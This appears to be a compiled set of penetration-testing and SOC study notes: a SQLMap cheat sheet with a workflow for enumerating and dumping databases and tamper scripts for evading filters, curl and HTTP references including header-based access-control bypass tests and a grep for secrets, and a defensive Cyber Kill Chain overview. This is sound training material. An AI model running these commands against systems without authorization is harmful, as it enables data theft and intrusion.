docs.title: Tamper Scripts
docs.text:
List tamper scripts:

sqlmap --list-tampers

Use tamper script:

sqlmap -u "http://example.com/item?id=1" --tamper=space2comment

Multiple tampers:

sqlmap -u "http://example.com/item?id=1" --tamper=between,randomcase,space2comment

docs.title: Proxying
docs.text:
Proxy through Burp:

sqlmap -u "http://example.com/item?id=1" --proxy=http://127.0.0.1:8080

Proxy request file through Burp:

sqlmap -r request.txt --proxy=http://127.0.0.1:8080

Ignore TLS errors:

sqlmap -u "https://example.com/item?id=1" --ignore-ssl-errors

docs.title: Useful Options
docs.text: Option Purpose --batch Use default answers --dbs List databases --tables List tables --columns List columns --dump Dump data -D Select database -T Select table -C Select columns -p Select parameter --cookie Add cookie -H Add header --proxy Use proxy --risk Risk level --level Test depth --tamper Apply tamper script

docs.title: Practical Workflow
docs.text: Phase Command Capture request Save from Burp Test request sqlmap -r request.txt --batch Focus parameter sqlmap -r request.txt -p PARAM --batch Enumerate DBs sqlmap -r request.txt --dbs Enumerate tables sqlmap -r request.txt -D DB --tables Dump target table sqlmap -r request.txt -D DB -T TABLE --dump

docs.title: Notes
docs.text:
• Always validate SQL injection manually when possible.
  • Request files from Burp are usually cleaner than long command-line URLs.
  • Use --risk and --level carefully because they increase test intensity.
  • Dump only what is authorized and necessary.
  • SQLMap traffic can be noisy and easy to detect.

docs.title: Executive Summary
docs.text:
This cheatsheet is a quick reference for HTTP requests, headers, methods, status codes, cookies, and common curl usage.

Use it when testing web applications, reproducing Burp requests, reviewing logs, or troubleshooting web behavior.

docs.title: HTTP Methods
docs.text: Method Purpose GET Retrieve a resource POST Submit data PUT Replace or upload a resource PATCH Partially update a resource DELETE Delete a resource HEAD Retrieve headers only OPTIONS Show supported methods

docs.title: Common Status Codes
docs.text: Code Meaning 200 OK 201 Created 204 No Content 301 Moved Permanently 302 Found / Redirect 304 Not Modified 400 Bad Request 401 Unauthorized 403 Forbidden 404 Not Found 405 Method Not Allowed 429 Too Many Requests 500 Internal Server Error 502 Bad Gateway 503 Service Unavailable

docs.title: Common Headers
docs.text: Header Purpose Host Target hostname User-Agent Client software Cookie Session or tracking data Authorization Auth token or credentials Content-Type Request body format Accept Expected response format Origin Source origin for CORS Referer Previous page X-Forwarded-For Original client IP, often proxy-related Location Redirect destination Set-Cookie Server sets cookie

docs.title: Content Types
docs.text: Content-Type Use application/x-www-form-urlencoded Standard HTML form body multipart/form-data File uploads application/json JSON API request application/xml XML request text/plain Plain text body

docs.title: Basic Curl
docs.text:
GET request:

curl http://example.com

Show headers only:

curl -I http://example.com

Verbose output:

curl -v http://example.com

Follow redirects:

curl -L http://example.com

Save response to file:

curl -o output.html http://example.com

Ignore TLS certificate errors:

curl -k https://example.com

docs.title: Curl with Headers
docs.text:
Add header:

curl -H "Header-Name: value" http://example.com

Set User-Agent:

curl -A "Mozilla/5.0" http://example.com

Set Host header:

curl -H "Host: admin.example.com" http://TARGET_IP

Add cookie:

curl -H "Cookie: session=VALUE" http://example.com

Add bearer token:

curl -H "Authorization: Bearer TOKEN" http://example.com/api

docs.title: POST Requests
docs.text:
Form POST:

curl -X POST -d "username=admin&password=test" http://example.com/login

JSON POST:

curl -X POST http://example.com/api \
  -H "Content-Type: application/json" \
  -d '{"name":"test"}'

Upload file:

curl -X POST http://example.com/upload \
  -F "file=@example.txt"

PUT upload:

curl -T file.txt http://example.com/uploads/file.txt

docs.title: Cookies
docs.text:
Save cookies:

curl -c cookies.txt http://example.com/login

Use cookies:

curl -b cookies.txt http://example.com/profile

Send cookie manually:

curl -H "Cookie: session=VALUE" http://example.com

docs.title: Proxying Through Burp
docs.text:
Send curl traffic through Burp:

curl -x http://127.0.0.1:8080 http://example.com

For HTTPS with Burp:

curl -k -x http://127.0.0.1:8080 https://example.com

docs.title: Common Test Headers
docs.text:
Forwarded IP:

X-Forwarded-For: 127.0.0.1

Real IP:

X-Real-IP: 127.0.0.1

Original URL:

X-Original-URL: /admin

Rewrite URL:

X-Rewrite-URL: /admin

JSON content type:

Content-Type: application/json

docs.title: Manual Request Example
docs.text:
GET /admin HTTP/1.1
Host: example.com
User-Agent: Mozilla/5.0
Cookie: session=VALUE
Accept: */*
Connection: close

docs.title: Access Control Request Tests
docs.text: Test Action Remove auth Delete Cookie or Authorization header Change user ID Modify id, user, or object parameters Change method Try GET, POST, PUT, DELETE Change content type Try JSON vs form encoding Add proxy headers Test X-Forwarded-For and similar headers Direct path access Request hidden or admin paths manually

docs.title: Useful Grep Patterns
docs.text:
Search URLs:

grep -Eo 'https?://[^"]+' file.html

Search JavaScript endpoints:

grep -Eo '["'\''][/A-Za-z0-9._?=&-]+["'\'']' app.js

Search for secrets:

grep -Ei "api|token|secret|key|password|bearer" file.txt

docs.title: Notes
docs.text:
• 401 usually means authentication is required.
  • 403 usually means authentication worked but access is denied.
  • 302 after login may indicate success.
  • Response length changes can reveal behavior even when status codes match.
  • Always compare requests from different user roles when testing access control.

docs.title: Defensive Security
docs.text: Notes on SOC concepts, monitoring, threat detection, traffic analysis, incident response, and security solutions.

docs.title: Frameworks
docs.text: Security frameworks help organize how defenders understand attacks, adversary behavior, intrusion stages, and threat intelligence.

docs.title: Topics
docs.text:
• MITRE ATT&CK — Adversary tactics, techniques, and procedures used to map real-world attacks.
  • Cyber Kill Chain — A staged model for understanding how attacks progress from reconnaissance to actions on objectives.
  • Unified Kill Chain — An expanded intrusion model that covers modern attack paths.
  • Diamond Model — A threat intelligence model based on adversary, capability, infrastructure, and victim relationships.

docs.title: Cyber Kill Chain
docs.text:
The Cyber Kill Chain is a framework developed by Lockheed Martin to describe the stages of a cyberattack.

It helps defenders understand how attacks progress and where security controls can interrupt the attacker.

docs.title: Overview
docs.text:
The Cyber Kill Chain breaks an intrusion into sequential phases.

The main idea:

If defenders interrupt any stage, the attack may fail.

It is useful for:

  • Understanding attacker goals
  • Building layered defenses
  • Identifying control gaps
  • Structuring incident timelines
  • Training SOC analysts
  • Explaining ransomware and APT activity

docs.title: The Seven Phases
docs.text: Phase Description Reconnaissance Attacker gathers information Weaponization Attacker prepares payload and infrastructure Delivery Payload is delivered to the target Exploitation Vulnerability is triggered Installation Malware or backdoor is installed Command and Control Compromised host communicates with attacker Actions on Objectives Attacker completes their goal

docs.title: 1. Reconnaissance
docs.text:
Reconnaissance is the information-gathering phase.

Attackers may collect:

  • Domains
  • IP addresses
  • Employee names
  • Email addresses
  • Technologies used
  • Exposed services
  • Public documents
  • Social media information
  • Leaked credentials

Defensive opportunities:

  • Reduce public exposure
  • Monitor for scanning
  • Watch for credential leaks
  • Limit public metadata
  • Harden exposed services

docs.title: 2. Weaponization
docs.text:
Weaponization is where the attacker prepares the attack package.

Examples:

  • Malicious document
  • Exploit payload
  • Phishing kit
  • Malware loader
  • Backdoor
  • Exploit chain
  • Command and control infrastructure

Defensive opportunities:

  • Threat intelligence
  • Malware analysis
  • Detection engineering
  • Block known malicious infrastructure
  • Monitor suspicious file types

docs.title: 3. Delivery
docs.text:
Delivery is how the attack reaches the victim.

Common delivery methods:

  • Phishing email
  • Malicious attachment
  • Malicious link
  • Drive-by download
  • USB device
  • Exposed service exploitation
  • Supply chain compromise

Defensive opportunities:

  • Email filtering
  • Web filtering
  • Attachment sandboxing
  • User awareness training
  • Blocking risky file types
  • Network monitoring

docs.title: 4. Exploitation
docs.text:
Exploitation occurs when the attacker triggers a vulnerability or abuses a weakness.

Examples:

  • Exploiting a vulnerable web application
  • Running malicious macro code
  • Exploiting a public-facing service
  • Abusing weak credentials
  • Exploiting browser or plugin vulnerabilities

Defensive opportunities:

  • Patch management
  • Secure configuration
  • Input validation
  • Exploit protection
  • EDR monitoring
  • Web application firewalls

docs.title: 5. Installation
docs.text:
Installation is where the attacker establishes a foothold.

Examples:

  • Installing malware
  • Dropping a web shell
  • Creating a scheduled task
  • Modifying registry run keys
  • Creating a malicious service
  • Adding startup folder entries

This phase often overlaps with persistence.

docs.title: Persistence
docs.text:
Persistence allows an attacker to regain access after reboot, detection, or loss of initial access.

Examples:

Method Description Web shell Server-side script used to execute commands Backdoor payload Malware or remote-control payload Windows service Malicious service created or modified Run keys Registry entries that execute at login Startup folder Files that run when a user logs in

Example MITRE mapping:

Create or Modify System Process: Windows Service
T1543.003

Defensive opportunities:

  • Monitor service creation
  • Monitor registry run keys
  • Monitor startup folders
  • Detect unusual web files
  • Review scheduled tasks
  • Use EDR and file integrity monitoring

docs.title: 6. Command and Control
docs.text:
Command and Control, or C2, is the communication channel between compromised systems and attacker infrastructure.

C2 allows attackers to:

  • Send commands
  • Receive output
  • Download tools
  • Exfiltrate data
  • Move laterally
  • Maintain remote control

Common C2 channels:

Channel Notes HTTP/HTTPS Blends with web traffic DNS Can be used for DNS tunneling IRC Older C2 method Cloud services May blend with legitimate traffic

Defensive opportunities:

  • DNS monitoring
  • Proxy logs
  • EDR network telemetry
  • Beaconing detection
  • Block suspicious domains
  • TLS inspection where appropriate
  • Egress filtering

docs.title: C2 Beaconing
docs.text:
Beaconing occurs when malware repeatedly contacts attacker infrastructure.

Beacon indicators:

  • Regular repeated connections
  • Same destination over time
  • Strange user agents
  • Unusual DNS query patterns
  • Connections to newly registered domains
